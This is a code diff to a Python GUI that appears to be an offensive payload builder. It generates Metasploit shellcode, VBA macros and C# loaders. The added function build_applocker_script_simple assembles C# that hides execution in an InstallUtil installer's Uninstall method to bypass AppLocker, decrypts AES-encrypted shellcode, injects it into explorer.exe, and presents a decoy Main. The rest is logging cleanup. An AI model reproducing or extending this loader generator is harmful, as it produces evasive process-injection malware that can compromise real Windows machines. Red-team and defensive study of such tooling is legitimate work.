@@ -2,8 +2,11 @@ import ttkbootstrap as tb
 from PIL import Image, ImageTk
 from tkinter import END
 import psutil, json, os, re
+import logging
 from core.builder import generate_shellcode_threaded, build_exe_from_output
 from core.ui_helpers import copy_msf_command, update_msf_entry
+
+logger = logging.getLogger(__name__)
 
 # creating UI components
 def create_base_layout(root, center_width=450):
@@ -21,7 +24,9 @@ def create_base_layout(root, center_width=450):
     center_frame.pack(side=tb.LEFT, fill=tb.BOTH, expand=False)
     center_frame.pack_propagate(False)  # Prevent frame from shrinking to fit contents
 
-    root.configure(background="#1f2523")
+    # Only configure background if root is actually the main window (not a tab frame)
+    if hasattr(root, 'wm_title'):  # Check if it's a top-level window
+        root.configure(background="#1f2523")
 
     # Load and resize background images
     left_bg_original = Image.open("frameImages/left_bg.png")
@@ -326,7 +331,7 @@ def copy_csproj_to_clipboard(app):
     except ImportError:
         app.top_status_label.config(text="pyperclip not installed", foreground="#ff5555")
         app.flicker_widget(app.top_status_label, "#ff0000", "#1f1f1f", steps=4, interval=60, final_color="#ec1c3a")
-        print("Error: pyperclip module not installed. Install with: pip install pyperclip")
+        logger.error("pyperclip module not installed. Install with: pip install pyperclip")
         return
     
     full_output = app.output_text.get("1.0", "end").strip()
@@ -343,7 +348,7 @@ def copy_csproj_to_clipboard(app):
     except Exception as e:
         app.top_status_label.config(text="Copy failed", foreground="#ff5555")
         app.flicker_widget(app.top_status_label, "#ff0000", "#1f1f1f", steps=4, interval=60, final_color="#ec1c3a")
-        print(f"Copy to clipboard failed: {e}")
+        logger.error(f"Copy to clipboard failed: {e}")
 
 # Copy VBA Macro to clipboard
 def copy_vba_macro_to_clipboard(app):
@@ -369,12 +374,12 @@ def copy_vba_macro_to_clipboard(app):
         app.bottom_status_label.config(text="to clipboard", foreground="#00ff00")
         app.flicker_widget(app.top_status_label, "#00ff00", "#2e2e2e", final_color="#00ff00")
         
-        print("[+] VBA Macro copied to clipboard successfully")
+        logger.info("VBA Macro copied to clipboard successfully")
         
     except Exception as e:
         app.top_status_label.config(text="Copy failed", foreground="#ff5555")
         app.flicker_widget(app.top_status_label, "#ff0000", "#1f1f1f", steps=4, interval=60, final_color="#ec1c3a")
-        print(f"[!] Error copying to clipboard: {e}")
+        logger.error(f"Error copying to clipboard: {e}")
 
 # Update the build button based on selected technique
 def update_build_button(app):
@@ -621,12 +626,12 @@ def load_and_display_applocker_bypass(app):
     try:
         # Get the currently selected technique
         current_technique = app.selected_technique.get()
-        print(f"[*] Merging {current_technique} with AppLocker bypass")
+        logger.info(f"Merging {current_technique} with AppLocker bypass")
         
         # Load the current technique template
         technique_template = app.get_selected_template()
         if not technique_template:
-            print(f"[!] No template found for technique: {current_technique}")
+            logger.error(f"No template found for technique: {current_technique}")
             return
         
         # Load the AppLocker bypass template from new modular system
@@ -634,7 +639,7 @@ def load_and_display_applocker_bypass(app):
         all_templates = load_template_data()
         
         if "applocker_bypass" not in all_templates:
-            print(f"[!] AppLocker bypass template not found in modular system")
+            logger.error("AppLocker bypass template not found in modular system")
             return
             
         applocker_template = all_templates["applocker_bypass"]
@@ -654,18 +659,18 @@ def load_and_display_applocker_bypass(app):
             aes_values = extract_aes_values_from_script(normal_script)
             
             # Build AppLocker script with real AES values
-            final_script = build_applocker_script_with_real_values(
+            final_script = build_applocker_script_simple(
                 technique_template, applocker_template, aes_values
             )
         else:
             # Fallback to placeholder-based approach if no shellcode available
-            final_script = build_applocker_script_directly(technique_template, applocker_template)
+            final_script = build_applocker_script_simple(technique_template, applocker_template, {})
         
         # Display the C# code in the center frame
         app.render_script(final_script)
         
     except Exception as e:
-        print(f"[!] Error merging technique with AppLocker bypass: {e}")
+        logger.error(f"Error merging technique with AppLocker bypass: {e}")
         app.output_text.configure(state="normal")
         app.output_text.delete("1.0", tb.END)
         app.output_text.insert(tb.END, f"[!] Error merging templates: {e}")
@@ -685,7 +690,7 @@ def restore_previous_content(app):
             app.output_text.tag_lower("sel")
             app.output_text.configure(state="disabled")
     except Exception as e:
-        print(f"[!] Error restoring previous content: {e}")
+        logger.error(f"Error restoring previous content: {e}")
         # Fallback to showing background image if restore fails
         try:
             app.output_text.configure(state="normal")
@@ -1198,6 +1203,149 @@ def build_applocker_script_with_real_values(technique_template, applocker_templa
                 script_lines.append(f"    {line}")
             else:
                 script_lines.append(line)
+        script_lines.append("")
+    
+    script_lines.append("}")
+    script_lines.append("")
+    
+    # Add Program class with decoy main only
+    script_lines.append("class Program")
+    script_lines.append("{")
+    script_lines.append("    static void Main(string[] args)")
+    script_lines.append("    {")
+    script_lines.append("        Console.WriteLine(\"Decoy Main() - Nothing to see here...\");")
+    script_lines.append("    }")
+    script_lines.append("}")
+    
+    return "\n".join(script_lines)
+
+def build_applocker_script_simple(technique_template, applocker_template, aes_values):
+    """Build AppLocker bypass C# code with simplified merging to avoid syntax errors"""
+    
+    # Get all components from technique template
+    technique_directives = technique_template.get("directives", [])
+    technique_functions = technique_template.get("function_declarations", [])
+    technique_constants = technique_template.get("constant_declarations", [])
+    technique_code_blocks = technique_template.get("code_blocks", {})
+    technique_function_defs = technique_template.get("function_definitions", [])
+    
+    # Get components from applocker template
+    applocker_directives = applocker_template.get("directives", [])
+    applocker_functions = applocker_template.get("function_declarations", [])
+    
+    # Merge directives
+    all_directives = list(technique_directives)
+    for directive in applocker_directives:
+        if directive not in all_directives:
+            all_directives.append(directive)
+    
+    # Merge function declarations, but filter out functions that reference missing structs
+    all_functions = list(technique_functions)
+    
+    # Check which structs are available in the technique template
+    available_structs = set()
+    for line in technique_function_defs:
+        if "struct " in line and "public struct " in line:
+            # Extract struct name
+            parts = line.strip().split()
+            if len(parts) >= 3 and parts[0] == "public" and parts[1] == "struct":
+                available_structs.add(parts[2])
+    
+    # Only add AppLocker functions if their dependencies are available
+    for func in applocker_functions:
+        if func not in all_functions:
+            # Check if this function references structs that aren't available
+            func_needs_missing_struct = False
+            if "STARTUPINFO" in func and "STARTUPINFO" not in available_structs:
+                func_needs_missing_struct = True
+            if "PROCESS_INFORMATION" in func and "PROCESS_INFORMATION" not in available_structs:
+                func_needs_missing_struct = True
+            
+            if not func_needs_missing_struct:
+                all_functions.append(func)
+            else:
+                print(f"[DEBUG] Skipping function with missing struct dependency: {func[:80]}...")
+    
+    # Build the complete C# script
+    script_lines = []
+    
+    # Add using statements
+    for directive in all_directives:
+        script_lines.append(directive)
+    script_lines.append("")
+    
+    # Add Sample installer class
+    script_lines.append("[System.ComponentModel.RunInstaller(true)]")
+    script_lines.append("public class Sample : System.Configuration.Install.Installer")
+    script_lines.append("{")
+    script_lines.append("    public override void Uninstall(System.Collections.IDictionary savedState)")
+    script_lines.append("    {")
+    
+    # Add all technique code blocks inside the installer method
+    for key, block in technique_code_blocks.items():
+        # Skip problematic code blocks that don't work well in AppLocker context
+        if key in ["timing_check"]:
+            print(f"[DEBUG] Skipping problematic code block: {key}")
+            continue
+            
+        script_lines.append(f"        // --- {key.replace('_', ' ').title()} ---")
+        
+        # Special handling for get_process block that uses args
+        if key == "get_process":
+            script_lines.append("        uint processId;")
+            script_lines.append("        string processName;")
+            script_lines.append("        // AppLocker bypass: Always use explorer.exe (no command line args available)")
+            script_lines.append("        Console.WriteLine(\"[*] No PID supplied, falling back to explorer.exe\");")
+            script_lines.append("        Process[] processes = Process.GetProcessesByName(\"explorer\");")
+            script_lines.append("        if (processes.Length == 0) {")
+            script_lines.append("            Console.WriteLine(\"[!] explorer.exe not found.\");")
+            script_lines.append("            return;")
+            script_lines.append("        }")
+            script_lines.append("        processId = (uint)processes[0].Id;")
+            script_lines.append("        processName = processes[0].ProcessName;")
+            script_lines.append("        Console.WriteLine($\"[*] Shellcode Injection into: {processName} (PID: {processId})\");")
+        else:
+            # Handle other blocks normally, replacing AES placeholders with real values
+            for line in block:
+                processed_line = line
+                
+                # Replace AES placeholders with actual values if available
+                if aes_values.get("shellcode"):
+                    processed_line = processed_line.replace("ENCRYPTED_SHELLCODE_B64", aes_values["shellcode"])
+                if aes_values.get("key"):
+                    processed_line = processed_line.replace("AES_KEY_B64", aes_values["key"])
+                if aes_values.get("iv"):
+                    processed_line = processed_line.replace("AES_IV_B64", aes_values["iv"])
+                
+                script_lines.append(f"        {processed_line}")
+        script_lines.append("")
+    
+    script_lines.append("    }")
+    script_lines.append("")
+    
+    # Add DLL imports inside Sample class
+    if all_functions:
+        script_lines.append("    // DLL Imports")
+        for func in all_functions:
+            script_lines.append(f"    {func}")
+        script_lines.append("")
+    
+    # Add constants inside Sample class
+    if technique_constants:
+        script_lines.append("    // Constants")
+        for const in technique_constants:
+            script_lines.append(f"    {const}")
+        script_lines.append("")
+    
+    # Add only the essential function definitions from the technique template
+    # Skip AppLocker template functions to avoid duplicates
+    if technique_function_defs:
+        script_lines.append("    // Helper Functions and Structs")
+        for line in technique_function_defs:
+            if line.strip():
+                script_lines.append(f"    {line}")
+            else:
+                script_lines.append("")
         script_lines.append("")
     
     script_lines.append("}")
